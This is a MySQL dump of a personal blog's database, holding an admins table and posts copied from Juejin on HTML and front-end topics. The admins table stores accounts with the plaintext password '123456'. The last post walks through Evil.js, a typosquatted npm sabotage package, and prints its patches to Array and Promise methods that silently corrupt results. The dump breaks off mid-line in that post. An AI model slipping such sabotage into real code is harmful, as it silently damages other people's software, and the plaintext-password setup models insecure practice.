/*
 Navicat Premium Data Transfer

 Source Server         : mysql
 Source Server Type    : MySQL
 Source Server Version : 80011
 Source Host           : localhost:3306
 Source Schema         : blog

 Target Server Type    : MySQL
 Target Server Version : 80011
 File Encoding         : 65001

 Date: 22/09/2022 08:37:23
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for admins
-- ----------------------------
DROP TABLE IF EXISTS `admins`;
CREATE TABLE `admins`  (
  `id` bigint(20) NOT NULL,
  `account` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `password` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `token` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of admins
-- ----------------------------
INSERT INTO `admins` VALUES (1, 'admin', '123456', '057830e3-d239-4360-9114-a70aabcc5e5a');
INSERT INTO `admins` VALUES (2, 'admin2', '123456', 'b7a3acf9-3d92-49c0-88ac-30134d4cdc03');

-- ----------------------------
-- Table structure for blog
-- ----------------------------
DROP TABLE IF EXISTS `blog`;
CREATE TABLE `blog`  (
  `id` bigint(20) NOT NULL,
  `category_id` bigint(20) NULL DEFAULT NULL,
  `title` varchar(200) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `content` text CHARACTER SET utf8 COLLATE utf8_general_ci NULL,
  `create_time` bigint(20) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of blog
-- ----------------------------
INSERT INTO `blog` VALUES (350099004600389, 347616261972037, 'HTML小面试题', '<p><br></p><p>1. DOCTYPE 有什么作用？怎么写？<br> 2. 列出常见的标签，并简单介绍这些标签用在什么场景？<br> 3. 页面出现了乱码，是怎么回事？如何解决？<br> 4. title 属性和 alt 属性分别有什么作用？<br> 5. HTML 的注释怎样写？<br> 6. HTML5 为什么只写 &lt;!DOCTYPE html&gt; ？<br> 7. data- 属性的作用？<br> 8. &lt;img&gt; 的 title 和 alt 有什么区别？<br> 9. Web 标准以及 W3C 标准是什么？<br>10. DOCTYPE 作用? 严格模式与混杂模式如何区分？它们有何意义?<br>11. HTML 全局属性（Global Attribute）有哪些？<br><br>12. 以下哪种多媒体格式支持最广泛？<br> &nbsp;❌ .m3u8<br> &nbsp;✅ .mp4<br> &nbsp;❌ .wmv<br> &nbsp;❌ .flv<br> &nbsp;❌ .mov<br><br>13. 打开一个页面，发现页面出现了乱码，以下说法正确的是：<br> &nbsp;✅ 英文和数字不会出现乱码，中文可能会出现。<br> &nbsp;❌ 只要给 HTML 的 head 标签里加 &lt;meta charset=\"UTF-8\"&gt; 就一定能解决乱码问题。<br> &nbsp;✅ 给 HTML 的 head 标签里加 &lt;meta charset=\"UTF-8\"&gt; 不一定能解决乱码问题。<br> &nbsp;✅ 页面保存的时候用的是什么编码格式，就给 HTML 的 head 标签里 meta 的 charset 属性设置<br> &nbsp; &nbsp; 相同编码格式。<br><br>14. 关于浏览器乱码，以下说法正确的是？(不定项)<br> &nbsp;❌ 只要在 HTML 的 head 标签里设置 &lt;meta charset=\"UTF-8\"&gt; 就一定能解决乱码问题。<br> &nbsp;✅ 用不合适的编辑器编辑文件，常常会出现乱码，比如 Windows 记事本。<br> &nbsp;✅ HTML 保存的时候需关注保存时的编码格式，保存什么格式，就设置 &lt;meta charset=\"xxx\"&gt; ，<br> &nbsp; &nbsp; 其中 xxx 为保存文件时的编码格式。<br> &nbsp;❌ 如果 HTML 里只有英文和数字，一般不会出现乱码，所以 HTML 里没必要设置 charset 了。<br>作者：itsOli<br>链接：https://juejin.cn/post/6844903815586512904<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>', 1663310189795);
INSERT INTO `blog` VALUES (350099378032709, 347616261972037, '先睹为快即将到来的HTML6', '<p><br></p><p>HTML，超文本标记语言，是一种用于创建网页的标准标记语言。自从引入 HTML 以来，它就一直用于构建互联网。与 JavaScript 和 CSS 一起，HTML 构成前端开发的三剑客。</p><p>尽管许多新技术使网站创建过程变得更简单、更高效，但 HTML 始终是核心。随着 HTML5 的普及，在 2014 年，这种标记语言发生了很多变化，变得更加友好，浏览器对新标准的支持热度也越来越高。而HTML并不止于此，还在不断发生变化，并且可能会获得一些特性来证明对 HTML6 的命名更改是合理的。</p><h3>支持原生模式</h3><p>该元素<code>&lt;dialog&gt;</code> 将随 HTML6 一起提供。它被认为等同于用 JavaScript 开发的模态，并且已经标准化，但只有少数浏览器完全支持。但这种现象会改变，很快它将在所有浏览器中得到支持。</p><p>这个元素在其默认格式下，只会将光标显示在它所在的位置上，但可以使用 JavaScript 打开模式。</p><pre><code class=\"language-hljs language-ini copyable\">&lt;dialog&gt;\n  &lt;form method=\"dialog\"&gt;\n    &lt;input type=\"submit\" value=\"确定\" /&gt;\n    &lt;input type=\"submit\" value=\"取消\" /&gt;\n  &lt;/form&gt;\n&lt;/dialog&gt;\n复制代码</code></pre><p>在默认形式下，该元素创建一个灰色背景，其下方是非交互式内容。</p><p>可以在 <code>&lt;dialog&gt;</code> 其中的表单上使用一种方法，该方法将发送值并将其传递回自身 <code>&lt;dialog&gt;</code>。</p><p>总的来说，这个标签在用户交互和改进的界面中变得有益。</p><p>可以通过更改 <code>&lt;dialog&gt;</code> 标签的 <code>open</code> 属性以控制打开和关闭。</p><pre><code class=\"language-hljs language-xml copyable\">&lt;dialog open&gt;\n  &lt;p&gt;组件内容&lt;/p&gt;\n&lt;/dialog&gt;\n复制代码</code></pre><h3>没有 JavaScript 的单页应用程序</h3><p>FutureClaw 杂志主编 Bobby Mozumder 建议：</p><blockquote>将锚元素链接到 JSON/XML、API 端点，让浏览器在内部将数据加载到新的数据结构中，然后浏览器将 DOM 元素替换为根据需要加载的任何数据。初始数据（以及标准错误响应）可以放在标题装置中，如果需要，可以稍后替换。</blockquote><p>据他介绍，这是单页应用程序网页设计模式，可以提高响应速度和加载时间，因为不需要加载 JavaScript。</p><h3>自由调整图像大小</h3><p>HTML6 爱好者相信即将到来的更新将允许浏览器调整图像大小以获得更好的观看体验。</p><p>每个浏览器都难以呈现相对于设备和屏幕尺寸的最佳图像尺寸，不幸的是，<code>srce</code> 标签 <code>img</code> 在处理这个问题时不是很有效。</p><p>这个问题可以通过一个新标签 <code>&lt;srcset&gt;</code> 来解决，它使浏览器在多个图像之间进行选择的工作变得更加容易。</p><h3>专用库</h3><p>将可用库引入 HTML6 绝对是提高开发效率的重要一步。</p><h3>微格式</h3><p>很多时候，需要在互联网上定义一般信息，而这些一般信息可以是任何公开的信息，例如电话号码、姓名、地址等。微格式是能够定义一般数据的标准。微格式可以增强设计者的能力，并可以减少搜索引擎推断公共信息所需的努力。</p><h3>自定义菜单</h3><p>尽管标签<code>&lt;ul&gt;</code>、<code>&lt;ol&gt;</code>非常有用，但在某些情况下仍有一些不足之处。可以处理交互元素的标签将是一个不错的选择。</p><p>这就是创建标签 <code>&lt;menu&gt;</code> 的驱动力，它可以处理按钮驱动的列表元素。</p><pre><code class=\"language-hljs language-xml copyable\">&lt;menu type=\"toolbar\"&gt;\n  &lt;li&gt;&lt;button&gt;个人信息&lt;/button&gt;&lt;/li&gt;\n  &lt;li&gt;&lt;button&gt;系统设置&lt;/button&gt;&lt;/li&gt;\n  &lt;li&gt;&lt;button&gt;账号注销&lt;/button&gt;&lt;/li&gt;\n&lt;/menu&gt;\n复制代码</code></pre><p>因此 <code>&lt;menu&gt;</code>，除了能够像普通列表一样运行之外，还可以增强 HTML 列表的功能。</p><h3>增强身份验证</h3><p>虽然HTML5在安全性方面还不错，浏览器和网络技术也提供了合理的保护。毫无疑问，在身份验证和安全领域还有很多事情可以做。如密钥可以异地存储；这将防止不受欢迎的人访问并支持身份验证。使用嵌入式密钥而不是 cookie，使数字签名更好等。</p><h3>集成摄像头</h3><p>HTML6 允许以更好的方式使用设备上的相机和媒体。将能够控制相机、它的效果、模式、全景图像、HDR 和其他属性。</p><h3>总结</h3><p>没有什么是完美的，HTML 也不是完美的，所以 HTML 规范可以做很多事情来使它更好。应该对一些有用的规范进行标准化，以增强 HTML 的能力。小的变化已经开始推出。如增强蓝牙支持、p2p 文件传输、恶意软件保护、云存储集成，下一个 HTML 版本可以考虑一下。<br>作者：天行无忌<br>链接：https://juejin.cn/post/7032874253573685261<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p><br></p>', 1663310280965);
INSERT INTO `blog` VALUES (350099979198533, 347616261972037, 'html篇-', '<p><br></p><p>也不知道有没有跟小编有同感的童鞋，随着技术的逐(ri)渐(yi)提(tui)升(bu)，对于一些底层的概念性的知识点却有些遗忘。有时候知道是这么个意思，但是表述出来的时候也没能完整的说到点子上。出现此现象的时候，小编觉得是时候该做点什么了（嗯！）。</p><p>以下是小编就这HTML常见的问题整理出来的知识点，后继还会出<strong>CSS</strong>，<strong>JS相关系列</strong>的文章，用于整理以及巩固基础。本篇着重针对的是萌新以及像小编一样对于一些基础概念性的东西有遗忘的童鞋，亦可作为处于跳槽阶段的童鞋作为温习的文章，若有记忆超凡的大佬请跳过。</p><p><img src=\"https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/172837a82999f950~tplv-t2oaga2asx-zoom-in-crop-mark:4536:0:0:0.awebp\" alt=\"\" data-href=\"\" style=\"\"/></p><p><br></p><p><br></p><p><strong>小建议： 鉴于文章多以文字为主，建议可以收藏，分次阅读，提高阅读效率。文中小编已标注好分割线</strong></p><hr/><p><br></p><h3>1. HTML、XML、XHTML 的区别</h3><ul><li><code>HTML</code>：超文本标记语言，是语法较为松散的、不严格的<code>Web</code>语言；</li><li><code>XML</code>：可扩展的标记语言，主要用于存储数据和结构，可扩展；</li><li><code>XHTML</code>：可扩展的超文本标记语言，基于<code>XML</code>，作用与<code>HTML</code>类似，但语法更严格。</li></ul><h3>2. 什么是HTML5以及和HTML的区别是什么</h3><h4>概念</h4><p><code>HTML5</code>是<code>HTML</code>的新标准，其主要目标是无需任何额外的插件如<code>Flash</code>、<code>Silverlight</code>等，就可以传输所有内容。它囊括了动画、视频、丰富的图形用户界面等。</p><p><code>HTML5</code>是由万维网联盟<code>（W3C）</code>和<code>Web Hypertext Application Technology Working Group</code> 合作创建的<code>HTML</code>新版本。</p><h4>区别</h4><p><strong>从文档声明类型上看</strong>：</p><ul><li><code>HTML</code>是很长的一段代码，很难记住。如下代码：</li></ul><pre><code class=\"language-hljs language-xml copyable\">&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"\nhttp://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n复制代码</code></pre><ul><li><code>HTML5</code>却只有简简单单的声明，方便记忆。如下：</li></ul><pre><code class=\"language-hljs language-xml copyable\">&lt;!DOCTYPE html&gt;\n复制代码</code></pre><p><strong>从语义结构上看</strong>：</p><ul><li><code>HTML4.0</code>：没有体现结构语义化的标签，通常都是这样来命名的<code>&lt;div id=\"header\"&gt;&lt;/div&gt;</code>，这样表示网站的头部。</li><li><code>HTML5</code>：在语义上却有很大的优势。提供了一些新的标签，比如：<code>&lt;header&gt;&lt;article&gt;&lt;footer&gt;</code>。</li></ul><p><strong>拓展</strong>： 不输入<code>&lt;!DOCTYPE HTML&gt;</code>，浏览器将无法识别<code>html</code>文件，因此<code>html</code>将无法正常工作。<br>作者：别催我码的慢<br>链接：https://juejin.cn/post/6844904180943945742<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p><br></p>', 1663310427734);
INSERT INTO `blog` VALUES (350100183568453, 347616261972037, 'HTML、XHTML和HTML5区别以及有什么联系', '<p><br></p><h4>XHTML与HTML的区别</h4><ul><li><code>XHTML</code>标签名必须小写；</li><li><code>XHTML</code>元素必须被关闭；</li><li><code>XHTML</code>元素必须被正确的嵌套；</li><li><code>XHTML</code>元素必须要有根元素。</li></ul><h4>XHTML与HTML5的区别</h4><ul><li><code>HTML5</code>新增了<code>canvas</code>绘画元素；</li><li><code>HTML5</code>新增了用于绘媒介回放的<code>video</code>和<code>audio</code>元素；</li><li>更具语义化的标签，便于浏览器识别；</li><li>对本地离线存储有更好的支持；</li><li><code>MATHML</code>，<code>SVG</code>等，可以更好的<code>render</code>；</li><li>添加了新的表单控件：<code>calendar</code>、<code>date</code>、<code>time</code>、<code>email</code>等。</li></ul><h4>HTML、XHTML、HTML5之间联系</h4><ul><li><code>XHTML</code>是<code>HTML</code>规范版本；</li><li><code>HTML5</code>是<code>HTML</code>、<code>XHTML</code>以及<code>HTML DOM</code>的新标准。<br>作者：别催我码的慢<br>链接：https://juejin.cn/post/6844904180943945742<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</li></ul>', 1663310477629);
INSERT INTO `blog` VALUES (350100368015429, 347616261972037, '将 HTML 生成图片', '<p><br></p><h5>项目需求</h5><p>1.前端添加管理员信息包括（姓名，年龄，头像等）<br>2.将管理员信息显示在具体背景图片上，将其生成图片的形式上传后台服务器（<strong>base64格式</strong>或者<strong>文件的格式</strong>）</p><h5>实现思路</h5><p>1.将管理员信息使用定位将其设置在指定背景图片上。<br>2.使用html2canvas将指定div生成canvas<br>3.将生成的canvas进行base64编码 或者生成文件 上传（建议base64上传）</p><h5>附加功能</h5><p>本地上传图片 进行base64编码之后回显<br>生成canvas之后支持本地下载</p><h5>压缩图片</h5><p>使用canvas API<br><strong>quality 值越小，所绘制出的图像越模糊 对应图片越小</strong> 根据需求设置相对应的数值</p><pre><code class=\"language-hljs language-ini copyable\"> var base64 = canvas.toDataURL(\'image/jpeg\', quality );\n复制代码</code></pre><p>点击访问<a href=\"https://link.juejin.cn?target=http%3A%2F%2F116.62.168.126%2Fpages%2FupLoadFile%2Findex.htm\" target=\"_blank\">Demo地址</a></p><p>下面笔记简单介绍html2canvas的使用<br><a href=\"https://link.juejin.cn?target=http%3A%2F%2Fhtml2canvas.hertzen.com%2F\" target=\"_blank\">html2canvas官网</a><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fniklasvh%2Fhtml2canvas\" target=\"_blank\">github</a></p><h3>1. 使用方法</h3><pre><code class=\"language-hljs language-scss copyable\"> html2canvas(document.getElementById(\'diploma\'), {\n        onrendered: function(canvas) {\n            $(\'#view\').html(canvas);  // 容器\n        },\n        width: 547,\n        height: 398\n    });\n复制代码</code></pre><p><strong>diploma</strong> html容器<br><strong>view</strong>放置将要生成图片的容器，设置固定宽高（547 * 398）</p><p><strong>注意：</strong> &nbsp;在生成图片的时候<strong>diploma容器不能被遮挡, 否则不能生成完整的canvas</strong></p><h3>2. 基本常用API</h3><table style=\"width: auto;\"><tbody><tr><th colSpan=\"1\" rowSpan=\"1\" width=\"auto\">参数名称</th><th colSpan=\"1\" rowSpan=\"1\" width=\"auto\">类型</th><th colSpan=\"1\" rowSpan=\"1\" width=\"auto\">默认值</th><th colSpan=\"1\" rowSpan=\"1\" width=\"auto\">描述</th></tr><tr><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">background</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">string</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">#fff</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">如果使用的是png背景图片这里可是使用如果没有 默认透明</td></tr><tr><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">height</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">number</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">null</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">需要手动设置</td></tr><tr><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">width</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">number</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">null</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">需要手动设置</td></tr><tr><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">timeout</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">number</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">0</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">图片加载延时 &nbsp;默认为0</td></tr><tr><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">timeout</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">number</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">0</td><td colSpan=\"1\" rowSpan=\"1\" width=\"auto\">图片加载延时 &nbsp;默认为0</td></tr></tbody></table><p><strong>其他API参看官网手册</strong></p><h3>3. 本地上传头base64编码（回显）</h3><p>FileReader接口提供了读取文件的方法和包含读取结果的事件模型<br><strong>主要是将上传的图片文件转换成base64</strong></p><pre><code class=\"language-hljs language-javascript copyable\">  var r = new FileReader()  \n    r.readAsDataURL(file)  \n    r.onload = function(e){\n        $(\'.avatar img\').attr(\'src\', e.target.result)  // 将img  src设置base64\n }\n复制代码</code></pre><p><strong>附上FileReader对象详细文档</strong></p><h3>4.canvas转base64上传</h3><p>将html2canvas生成的canvas转换成base64进行上传</p><pre><code class=\"language-hljs language-ini copyable\">var canvas = document.querySelector(\"#view canvas\")\n    var dataURL = canvas.toDataURL(\"image/png\");\n    dataURL = dataURL.split(\",\")[1];\n    return dataURL\n复制代码</code></pre><p><strong>附上canvas API文档</strong></p><h4>注意事项</h4><p>转换base64的时候需要一定时间可以使用promise函数异步去执行,在没有base64产生的时候执行会报错</p><p>组后点击下载 使用js将canvas转换成文件进行下载</p><pre><code class=\"language-hljs language-ini copyable\">function Download(){\n    //cavas 保存图片到本地  js 实现\n    //------------------------------------------------------------------------\n    //1.确定图片的类型  获取到的图片格式 data:image/Png;base64,......\n    var type =\'png\';//你想要什么图片格式 就选什么吧\n    var d=document.querySelector(\'#view canvas\');\n    var imgdata=d.toDataURL(type);\n    //2.0 将mime-type改为image/octet-stream,强制让浏览器下载\n    var fixtype=function(type){\n        type=type.toLocaleLowerCase().replace(/jpg/i,\'jpeg\');\n        var r=type.match(/png|jpeg|bmp|gif/)[0];\n        return \'image/\'+r;\n    };\n    imgdata=imgdata.replace(fixtype(type),\'image/octet-stream\');\n    //3.0 将图片保存到本地\n    var savaFile=function(data,filename)\n    {\n        var save_link=document.createElementNS(\'http://www.w3.org/1999/xhtml\', \'a\');\n        save_link.href=data;\n        save_link.download=filename;\n        var event=document.createEvent(\'MouseEvents\');\n        event.initMouseEvent(\'click\',true,false,window,0,0,0,0,0,false,false,false,false,0,null);\n        save_link.dispatchEvent(event);\n    };\n    var filename=\'\'+new Date().getDate()+\'.\'+type;\n    //直接用当前几号做的图片名字\n    savaFile(imgdata,filename);\n};\n复制代码\n只是个Demo 仅供参考 代码较乱 有待提高\n作者：Liter\n链接：https://juejin.cn/post/6844903540226261006\n来源：稀土掘金\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</code></pre><p><br></p><p><br></p><p><br></p>', 1663310522660);
INSERT INTO `blog` VALUES (350100604649541, 347616261972037, 'HTML 浮窗代码', '<p><br></p><p>最近在设计并撰写自己定义的第一个小项目,<br>其中在开发中需要使用到一个漂浮窗口的功能,<br>使用 <code>javascript</code> 撰写的,<br>先上一下我写好的成品样子：</p><p><img src=\"https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ffb0d7cd9b8c479a94b54c8247bd72f6~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp\" alt=\"\" data-href=\"\" style=\"\"/></p><p>这个浮窗是在右下角作为其他功能的,<br>分别是：回到顶部、GitHub 入口、掘金入口三个功能,<br>所以我把它写在 <code>.js</code> 里面作为界面加载完成后生成这个样式。</p><h3>代码实现</h3><pre><code class=\"language-hljs language-js copyable\">window.onload = function () {\n    let medusa = document.createElement(\'div\');\n    medusa.setAttribute(\'class\', \'medusa\');\n    let base_url = CheckImgExists(\'static/Github.png\') ? \'static/\' : \'../static/\';\n    medusa.innerHTML = \'\' +\n        \'&lt;div&gt;&lt;a onclick=\"goTop()\" title=\"Top\"&gt;&lt;img class=\"pass\" src=\"\' + base_url + \'Top.png\"&gt;&lt;/a&gt;&lt;/div&gt;\' +\n        \'&lt;div&gt;&lt;a href=\"https://www.github.com/MedusaSorcerer/\" title=\"Github\" target=\"_blank\"&gt;&lt;img class=\"pass\" src=\"\' + base_url + \'Github.png\"&gt;&lt;/a&gt;&lt;/div&gt;\' +\n        \'&lt;div&gt;&lt;a href=\"https://juejin.cn/user/2805609406139950\" title=\"掘金\" target=\"_blank\"&gt;&lt;img class=\"pass\" src=\"\' + base_url + \'Juejin.png\"&gt;&lt;/a&gt;&lt;/div&gt;\';\n    document.body.appendChild(medusa);\n}\n\nfunction CheckImgExists(url) {\n    let ImgObj = new Image();\n    ImgObj.src = url;\n    return ImgObj.width &gt; 0;\n}\n\nfunction goTop() {\n    let scrollToTop = setInterval(function () {\n        let pos = window.pageYOffset;\n        if (pos &gt; 0) {\n            window.scrollTo(0, pos - 20);\n        } else {\n            window.clearInterval(scrollToTop);\n        }\n    }, 10);\n}\n复制代码</code></pre><p>第一部分是在界面加载完成后执行 HTML 代码插入,<br>当然,<br>你需要替换其中的图片路径以及 <code>A</code> 标签 <code>HREF</code> 路径作为你自己的值,<br>第二部分是因为我在使用图片路径时遇到的解析问题,<br>所以第二个函数部分是判断图片路径是否存在,<br>否则使用 <code>../</code> 的方式追加到父级目录上,<br>第三部分则是使用回到顶部的按钮后缓和的回到顶部的代码,<br>而不是直接回到顶部,<br>做了一个动画效果。</p><p>下面是需要用到的 CSS 样式代码块。</p><pre><code class=\"language-hljs language-css copyable\">.medusa {\n    position: fixed;\n    right: 1%;\n    bottom: 5%;\n    width: 50px;\n    border: 1px solid #cdcccc;\n    background-color: white;\n    font-size: 20px;\n    z-index: 1040;\n    -webkit-backface-visibility: hidden;\n}\n\n.medusa &gt; div &gt; a &gt; img {\n    width: 30px;\n    height: 30px;\n}\n\n.medusa &gt; div {\n    margin: 5px 0 5px 9px;\n}\n\n.medusa &gt; div &gt; a {\n    padding: 0 0 7px 0;\n}\n\n.medusa &gt; div &gt; a:hover {\n    border-top: 2px solid #00a8e8;\n    border-bottom: 2px solid #e80000;\n}\n复制代码</code></pre><h3>图片资源<img src=\"https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c6d4b8e327e44c2eb4f20568db82bf90~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp\" alt=\"\" data-href=\"\" style=\"\"/><img src=\"https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b9a45b16988f4f60a9f7b0c7b9e60718~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp\" alt=\"\" data-href=\"\" style=\"\"/><img src=\"https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7a9ccaff7cfa4aa0adf809c1061b89e5~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp\" alt=\"\" data-href=\"\" style=\"\"/></h3><p><br><br><br><br><br></p><blockquote>长时间没有更新了，加油~<br>作者：MedusaSorcerer<br>链接：https://juejin.cn/post/6876312343018979342<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</blockquote><p><br></p>', 1663310580432);
INSERT INTO `blog` VALUES (350101083115589, 347616272224325, '火爆全网的 Evil.js 源码解读', '<p><br></p><p>2022年8月18日，一个名叫<code>Evil.js</code>的项目突然走红，README介绍如下：</p><blockquote>什么？黑心996公司要让你提桶跑路了？ 想在离开前给你们的项目留点小 礼物 ？ 偷偷地把本项目引入你们的项目吧，你们的项目会有但不仅限于如下的神奇效果： 当数组长度可以被7整除时，Array.includes 永远返回false。 当周日时，Array.map 方法的结果总是会丢失最后一个元素。 Array.filter 的结果有2%的概率丢失最后一个元素。 setTimeout 总是会比预期时间慢1秒才触发。 Promise.then 在周日时有10%不会注册。 JSON.stringify 会把I(大写字母I)变成l(小写字母L)。 Date.getTime() 的结果总是会慢一个小时。 localStorage.getItem 有5%几率返回空字符串。</blockquote><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/679f44f927bc4a1382f4fa58d50602f2~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><p>并且作者发布了这个包到npm上，名叫<code>lodash-utils</code>，一眼看上去，是个非常正常的npm包，跟<code>utils-lodash</code>这个正经的包的名称非常相似。</p><p><code><strong>如果有人误装了lodash-utils这个包并引入，代码表现可能就一团乱麻了，还找不到原因。真是给黑心996公司的小“礼物”了。</strong></code></p><p>现在，这个Github仓库已经被删除了(不过还是可以搜到一些人fork的代码)，npm包也已经把它标记为存在安全问题，将代码从npm上移除了。可见npm官方还是很靠谱的，及时下线有风险的代码。</p><p><img src=\"https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8e88be90dcde471ca6d65ed501125268~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image?\" alt=\"image.png\" data-href=\"\" style=\"\"/></p><h1>源码解析</h1><p>作者是如何做到的呢？我们可以学习一下，但是只单纯学技术，不要作恶噢。要做更多有趣的事情。</p><h2>立即执行函数</h2><p>代码整体是一个立即执行函数，</p><pre><code class=\"language-hljs language-js copyable\">(global =&gt; {\n  \n})((0, eval(\'this\')));\n复制代码</code></pre><p>该函数的参数是<code>(0, eval(\'this\'))</code>，返回值其实就是<code>window</code>，会赋值给函数的参数<code>global</code>。</p><blockquote>另有朋友反馈说，最新版本是这样的： (global =&gt; { })((0, eval)(\'this\')); 复制代码 该函数的参数是(0, eval)(\'this\')，目的是通过eval在间接调用下默认使用顶层作用域的特性，通过调用this获取顶层对象。这是兼容性最强获取顶层作用域对象的方法，可以兼容浏览器和node，并且在早期版本没有globalThis的情况下也能够很好地支持，甚至在window、globalThis变量被恶意改写的情况下也可以获取到(类似于使用void 0规避undefined关键词被定义)。</blockquote><h3>为什么要用立即执行函数？</h3><p>这样的话，内部定义的变量不会向外暴露。</p><p><strong>使用立即执行函数，可以方便的定义局部变量，让其它地方没办法引用该变量。</strong></p><p>否则，如果你这样写：</p><pre><code class=\"language-hljs language-html copyable\">&lt;script&gt;\n  const a = 1;\n&lt;/script&gt;\n&lt;script&gt;\n  const b = a + 1;\n&lt;/script&gt;\n复制代码</code></pre><p>在这个例子中，其它脚本中可能会引用变量<code>a</code>，此时<code>a</code>不算局部变量。</p><h2>includes方法</h2><p>数组长度可以被7整除时，本方法永远返回false。</p><pre><code class=\"language-hljs language-js copyable\">const _includes = Array.prototype.includes;\nArray.prototype.includes = function (...args) {\n  if (this.length % 7 !== 0) {\n    return _includes.call(this, ...args);\n  } else {\n    return false;\n  }\n};\n复制代码</code></pre><p><code>includes</code>是一个非常常用的方法，判断数组中是否包括某一项。而且兼容性还不错，除了IE基本都支持。</p><p>作者具体方案是先保存引用给<code>_includes</code>。重写<code>includes</code>方法时，有时候调用<code>_includes</code>，有时候不调用<code>_includes</code>。</p><p>注意，这里<code>_includes</code>是一个<strong>闭包变量</strong>。所以它会常驻内存（在堆中），但是开发者没有办法去直接引用。</p><h2>map方法</h2><p>当周日时，Array.map方法的结果总是会丢失最后一个元素。</p><pre><code class=\"language-hljs language-js copyable\">const _map = Array.prototype.map;\nArray.prototype.map = function (...args) {\n  result = _map.call(this, ...args);\n  if (new Date().getDay() === 0) {\n    result.length = Math.max(result.length - 1, 0);\n  }\n  return result;\n}\n复制代码</code></pre><p>如何判断周日？<code>new Date().getDay() === 0</code>即可。</p><p>这里作者还做了兼容性处理，兼容了数组长度为0的情况，通过<code>Math.max(result.length - 1, 0)</code>，边界情况也处理的很好。</p><h2>filter方法</h2><p>Array.filter的结果有2%的概率丢失最后一个元素。</p><pre><code class=\"language-hljs language-js copyable\">const _filter = Array.prototype.filter;\nArray.prototype.filter = function (...args) {\n  result = _filter.call(this, ...args);\n  if (Math.random() &lt; 0.02) {\n    result.length = Math.max(result.length - 1, 0);\n  }\n  return result;\n}\n复制代码</code></pre><p>跟<code>includes</code>一样，不多介绍了。</p><h2>setTimeout</h2><p>setTimeout总是会比预期时间慢1秒才触发。</p><pre><code class=\"language-hljs language-js copyable\">const _timeout = global.setTimeout;\nglobal.setTimeout = function (handler, timeout, ...args) {\n  return _timeout.call(global, handler, +timeout + 1000, ...args);\n}\n复制代码</code></pre><p>这个其实不太好，太容易发现了，不建议用。</p><h2>Promise.then</h2><p>Promise.then 在周日时有10%几率不会注册。</p><pre><code class=\"language-hljs language-js copyable\">const _then = Promise.prototype.then;\nPromise.prototype.then = function (...args) {\n  if (new Date().getDay() === 0 && Math.random() &lt; 0.1) {\n    return;\n  } else {\n    _then.call(this, ...args);\n  }\n}\n复制代码</code></pre><p>牛逼，周日的时候才出现的Bug，但是周日正好不上班。如果有用户周日反馈了Bug，开发者周一上班后还无法复现，会以为是用户环境问题。</p><h2>JSON.stringify</h2><p>JSON.stringify 会把\'I\'变成\'l\'。</p><pre><code class=\"language-hljs language-js copyable\">const _stringify = JSON.stringify;\nJSON.stringify = function (...args) {\n  return _stringify(...args).replace(/I/g, 